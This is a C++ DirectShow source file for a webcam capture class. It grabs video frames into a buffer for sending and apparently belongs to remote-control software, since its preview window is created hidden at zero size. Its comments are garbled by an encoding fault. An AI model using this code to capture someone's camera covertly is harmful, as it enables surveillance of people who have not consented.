// CaptureVideo.cpp: implementation of the CCaptureVideo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "CaptureVideo.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CSampleGrabberCB CCaptureVideo::mCB;

CCaptureVideo::CCaptureVideo()
{
    m_pCapture = NULL;
    m_pGB = NULL;
    m_pMC = NULL;
    m_pVW = NULL;
    m_pBF = NULL;
    m_pGrabber = NULL;
    m_bExit = FALSE;
    m_hWnd = NULL;
    if (FAILED(CoInitialize(NULL))) {
        return;
    }
}

CCaptureVideo::~CCaptureVideo()
{
    m_bExit = TRUE;
    if(m_pMC)m_pMC->StopWhenReady();
    if(m_pVW) {
        m_pVW->put_Visible(OAFALSE);
        m_pVW->put_Owner(NULL);
    }
    SAFE_RELEASE(m_pMC);
    SAFE_RELEASE(m_pVW);
    SAFE_RELEASE(m_pGB);
    SAFE_RELEASE(m_pBF);
    SAFE_RELEASE(m_pGrabber);
    SAFE_RELEASE(m_pCapture);

    CoUninitialize() ;
}

HRESULT CCaptureVideo::Open(int iDeviceID,int iPress)
{
    Mprintf("CCaptureVideo call Open\n");
    HRESULT hResult = S_OK;
    do {
        hResult = InitCaptureGraphBuilder();
        if (FAILED(hResult))
            break;
        if(!BindVideoFilter(iDeviceID, &m_pBF))
            break;

        hResult = m_pGB->AddFilter(m_pBF, L"Capture Filter");

        hResult = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER,
                                   IID_ISampleGrabber, (void**)&m_pGrabber);   //�����ڴ�
        if(FAILED(hResult))
            break;

        //m_pGrabber ��������   1 ��ʽ   2 �ڴ滺����ʽ
        CComQIPtr<IBaseFilter, &IID_IBaseFilter> pGrabBase(m_pGrabber);//������Ƶ��ʽ
        AM_MEDIA_TYPE mt;    //��Ƶ��ʽ
        ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
        mt.majortype = MEDIATYPE_Video;
        mt.subtype = MEDIASUBTYPE_RGB24; // MEDIASUBTYPE_RGB24

        hResult = m_pGrabber->SetMediaType(&mt);
        if(FAILED(hResult))
            break;

        hResult = m_pGB->AddFilter(pGrabBase,L"Grabber");

        if(FAILED(hResult))
            break;

        hResult = m_pCapture->RenderStream(&PIN_CATEGORY_PREVIEW,    //��̬
                                           &MEDIATYPE_Video,m_pBF,pGrabBase,NULL);
        if(FAILED(hResult)) {
            //��׽
            hResult = m_pCapture->RenderStream(&PIN_CATEGORY_CAPTURE,&MEDIATYPE_Video,m_pBF,pGrabBase,NULL);
            break;
        }

        if(FAILED(hResult))
            break;

        hResult = m_pGrabber->GetConnectedMediaType(&mt);

        if (FAILED(hResult))
            break;

        //3  ��׽����  FDO һ�������ݾͽ��� �ص��������� ����һ����

        VIDEOINFOHEADER * vih = (VIDEOINFOHEADER*) mt.pbFormat;
        //mCB �Ǹ�����һ���� ����ȫ�ֱ��� �и��ص�
        mCB.m_ulFullWidth = vih->bmiHeader.biWidth;
        mCB.m_ulFullHeight = vih->bmiHeader.biHeight;

        FreeMediaType(mt);

        hResult = m_pGrabber->SetBufferSamples( FALSE );  //�ص�����
        hResult = m_pGrabber->SetOneShot( FALSE );

        //������Ƶ����ص����� Ҳ�����������Ƶ����ʱ�ͻ����������BufferCB����

        //����OnTimer
        hResult = m_pGrabber->SetCallback(&mCB, 1);

        m_hWnd = CreateWindow("#32770", "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

        SetupVideoWindow();   //���δ���

        hResult = m_pMC->Run();    //����

        if(FAILED(hResult))
            break;
    } while (false);

    Mprintf("CCaptureVideo Open %s\n", FAILED(hResult) ? "failed" : "succeed");

    return hResult;
}


HRESULT CCaptureVideo::InitCaptureGraphBuilder()
{
    HRESULT hResult = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC,
                                       IID_ICaptureGraphBuilder2, (void**)&m_pCapture);   //��ʵ�豸

    if (FAILED(hResult)) {
        return hResult;
    }

    hResult=CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER,
                             IID_IGraphBuilder, (void**)&m_pGB);   //�����豸

    if (FAILED(hResult)) {
        return hResult;
    }
    //�����˰󶨵���ʵ�豸����
    m_pCapture->SetFiltergraph(m_pGB);
    hResult = m_pGB->QueryInterface(IID_IMediaControl,(LPVOID*)&m_pMC);
    if (FAILED(hResult)) {
        return hResult;
    }

    hResult = m_pGB->QueryInterface(IID_IVideoWindow,(LPVOID*) &m_pVW);
    if (FAILED(hResult)) {
        return hResult;
    }
    return hResult;
}

LPBITMAPINFO CCaptureVideo::GetBmpInfor()
{
    return mCB.GetBmpInfor();     //����λͼ�ڴ�ͷ������
}

BOOL CCaptureVideo::BindVideoFilter(int deviceId, IBaseFilter **pFilter)
{
    if (deviceId < 0)
        return FALSE;// enumerate all video capture devices
    CComPtr<ICreateDevEnum> pCreateDevEnum;
    HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
                                  IID_ICreateDevEnum, (void**)&pCreateDevEnum);
    if (hr != NOERROR) {
        return FALSE;
    }
    CComPtr<IEnumMoniker> pEm;
    hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory,&pEm, 0);
    if (hr != NOERROR) {
        return FALSE;
    }
    pEm->Reset();
    ULONG cFetched;
    IMoniker *pM;
    int index = 0;
    while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK, index <= deviceId) {
        IPropertyBag *pBag;
        //ͨ��BindToStorage ���Է��ʸ��豸�ı�ʶ��
        hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
        if(SUCCEEDED(hr)) {
            VARIANT var;
            var.vt = VT_BSTR;
            hr = pBag->Read(L"FriendlyName", &var, NULL);
            if (hr == NOERROR) {
                if (index == deviceId) {
                    pM->BindToObject(0, 0, IID_IBaseFilter, (void**)pFilter);
                }
                SysFreeString(var.bstrVal);
            }
            pBag->Release();  //���ü���--
        }
        pM->Release();
        index++;
    }
    return TRUE;
}


void CCaptureVideo::FreeMediaType(AM_MEDIA_TYPE& mt)
{
    if (mt.cbFormat != 0) {
        CoTaskMemFree((PVOID)mt.pbFormat);
        mt.cbFormat = 0;
        mt.pbFormat = NULL;
    }
    if (mt.pUnk != NULL) {
        mt.pUnk->Release();
        mt.pUnk = NULL;
    }
}


HRESULT CCaptureVideo::SetupVideoWindow()
{
    HRESULT hr;
    hr = m_pVW->put_Owner((OAHWND)m_hWnd);
    if (FAILED(hr))return hr;
    hr = m_pVW->put_WindowStyle(WS_CHILD | WS_CLIPCHILDREN);
    if (FAILED(hr))return hr;
    ResizeVideoWindow();
    hr = m_pVW->put_Visible(OATRUE);
    return hr;
}

void CCaptureVideo::ResizeVideoWindow()
{
    if (m_pVW) {
        RECT rc;
        ::GetClientRect(m_hWnd,&rc);
        m_pVW->SetWindowPosition(0, 0, rc.right, rc.bottom);  //���������õ�0 0 0 0 ��
    }
}

void  CCaptureVideo::SendEnd()            //���ͽ���  ���ÿ�����ȡ����
{
    InterlockedExchange((LPLONG)&mCB.bStact,CMD_CAN_COPY);
}

LPBYTE CCaptureVideo::GetDIB(DWORD& dwSize)
{
    BYTE *szBuffer = NULL;
    int n = 200; // 10sû�л�ȡ�������򷵻�NULL
    do {
        if (mCB.bStact==CMD_CAN_SEND) { //����ı���һ�·��͵�״̬
            if (szBuffer = mCB.GetNextScreen(dwSize)) //�Ƿ��ȡ����Ƶ
                break;
        }
        Sleep(50);
    } while (!m_bExit && --n);

    return szBuffer;
}
